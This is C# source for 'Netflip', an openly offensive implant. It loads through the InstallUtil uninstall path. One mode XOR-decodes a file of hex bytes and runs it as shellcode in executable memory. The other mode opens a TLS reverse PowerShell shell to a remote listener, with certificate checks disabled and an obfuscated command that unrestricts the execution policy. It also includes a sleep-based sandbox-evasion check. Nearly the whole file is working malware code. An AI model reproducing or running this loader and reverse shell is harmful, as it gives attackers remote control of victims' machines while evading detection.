using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Netflip
{

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {

        public override void Install(System.Collections.IDictionary savedState)
        {
            Console.WriteLine("Netflip is already installed.");
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            var argList = new List<string>();
            foreach (string arg in this.Context.Parameters.Keys)
            {
                argList.Add(string.Format("--{0}={1}", arg, this.Context.Parameters[arg]));
            }
            Program.Main(argList.ToArray());
        }

    }

    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static StreamWriter streamWriter;

        static class ExitCode
        {
            public const int ERROR_SUCCESS = 0;
            public const int ERROR_FILE_NOT_FOUND = 2;
            public const int ERROR_BAD_FORMAT = 11;
            public const int ERROR_BAD_COMMAND = 22;
            public const int ERROR_GEN_FAILURE = 31;
            public const int ERROR_BAD_NET_RESP = 58;
        }

        static bool ServerCertificateValid(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        static string ConvertInput(string input, int key)
        {
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; ++i)
            {
                output[i] = (byte)(input[i] ^ key);
            }
            return Encoding.ASCII.GetString(output);
        }

        static void RunTests()
        {
            DateTime timeNow = DateTime.Now;
            Sleep(6000);
            double timeThen = DateTime.Now.Subtract(timeNow).TotalSeconds;
            if (timeThen < 5)
            {
                System.Environment.Exit(ExitCode.ERROR_SUCCESS);
            }
            // More evasion goes here...
        }

        static string LoadFile(string path, string key)
        {
            try
            {
                return ConvertInput(System.IO.File.ReadAllText(path), Convert.ToByte(key, 16));
            }
            catch (System.IO.FileNotFoundException)
            {
                Console.WriteLine("File not found.");
                System.Environment.Exit(ExitCode.ERROR_FILE_NOT_FOUND);
            }
            return null;
        }

        public static void Main(string[] args)
        {
            string EXECUTE = "execute";
            string CONNECT = "connect";
            string KEY = "key";

            ArgParser.Parser argParser = new ArgParser.Parser();
            argParser.AddHelpText("Netflip (c) 1911-2600");
            argParser.AddArgument(KEY, "-k", "--key", "XOR key; --key=< hex >");
            argParser.AddArgument(EXECUTE, "-e", "--execute", "Executes comma-separated hexadecimal values; --execute=input.txt\nFormat (before XOR): < hex >,< hex >,< hex >,< hex >,< hex > ...");
            argParser.AddArgument(CONNECT, "-c", "--connect", "Connects to the remote listener using configuration file; --connect=input.txt\nFormat (before XOR): < remote_address >:< remote_port >");
            argParser.ParseArguments(args);
            if (!argParser.argValues.ContainsKey(KEY))
            {
                Console.WriteLine($"Argument \"{KEY}\" is required!");
                System.Environment.Exit(ExitCode.ERROR_BAD_COMMAND);
            }
            if (!(argParser.argValues.ContainsKey(CONNECT) || argParser.argValues.ContainsKey(EXECUTE)))
            {
                Console.WriteLine($"One of the mode arguments (\"{CONNECT}\" or \"{EXECUTE}\") is required!");
                System.Environment.Exit(ExitCode.ERROR_BAD_COMMAND);
            }
            if (argParser.argValues.ContainsKey(CONNECT) && argParser.argValues.ContainsKey(EXECUTE))
            {
                Console.WriteLine($"Only one mode is allowed (use \"{CONNECT}\" or \"{EXECUTE}\")");
                System.Environment.Exit(ExitCode.ERROR_BAD_COMMAND);
            }
            if (argParser.argValues.ContainsKey(EXECUTE))
            {
                RunTests();
                string inputText = LoadFile(argParser.argValues[EXECUTE], argParser.argValues[KEY]);
                string[] hexes = null;
                byte[] buf = null;
                try
                {
                    hexes = inputText.Split(',');
                    buf = new byte[hexes.Length];
                    for (int i = 0; i < hexes.Length - 1; ++i)
                    {
                        buf[i] = Convert.ToByte(hexes[i], 16);
                    }
                }
                catch (System.FormatException)
                {
                    Console.WriteLine("Bad encoding.");
                    System.Environment.Exit(ExitCode.ERROR_BAD_FORMAT);
                }
                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
                Marshal.Copy(buf, 0, addr, buf.Length);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            if (argParser.argValues.ContainsKey(CONNECT))
            {
                string inputText = LoadFile(argParser.argValues[CONNECT], argParser.argValues[KEY]);
                RunTests();
                string host = null;
                int port = 0;
                try
                {
                    string[] inputArgs = inputText.Split(':');
                    host = inputArgs[0];
                    port = int.Parse(inputArgs[1]);
                }
                catch (System.FormatException)
                {
                    Console.WriteLine("Bad encoding.");
                    System.Environment.Exit(ExitCode.ERROR_BAD_FORMAT);
                }
                try
                {
                    TcpClient client = new TcpClient(host, port);
                    using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ServerCertificateValid), null))
                    {
                        stream.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
                        using (StreamReader streamReader = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strCmd = new StringBuilder();
                            StringBuilder strOutput = new StringBuilder();
                            Runspace runspace = RunspaceFactory.CreateRunspace();
                            runspace.Open();
                            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
                            runSpaceInvoker.Invoke(ConvertInput("K}l5]`}{mlqwvHwtq{a85]`}{mlqwvHwtq{a8Mvj}kljq{l}|85K{wh}8Hjw{}kk", 24));  // "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process";

                            while (true)
                            {
                                using (Pipeline pipeline = runspace.CreatePipeline())
                                {
                                    try
                                    {
                                        streamWriter.Write($"PS> ");
                                        streamWriter.Flush();
                                        strCmd.Append(streamReader.ReadLine());
                                        pipeline.Commands.AddScript(strCmd.ToString());
                                        pipeline.Commands.Add("Out-String");
                                        strCmd.Remove(0, strCmd.Length);
                                        Collection<PSObject> results = new Collection<PSObject>();
                                        try
                                        {
                                            results = pipeline.Invoke();
                                        }
                                        catch (Exception ex)
                                        {
                                            strOutput.AppendLine(ex.ToString());
                                        }
                                        foreach (PSObject obj in results)
                                        {
                                            strOutput.AppendLine(obj.ToString());

                                        }
                                        streamWriter.WriteLine(strOutput.ToString());
                                        streamWriter.Flush();
                                        strOutput.Remove(0, strOutput.Length);
                                    }
                                    catch (System.IO.IOException)
                                    {
                                        System.Environment.Exit(ExitCode.ERROR_GEN_FAILURE);
                                    }
                                }

                            }
                        }
                    }
                }
                catch (System.Net.Sockets.SocketException)
                {
                    Console.WriteLine("Network error.");
                    System.Environment.Exit(ExitCode.ERROR_BAD_NET_RESP);
                }
            }
        }
    }

}
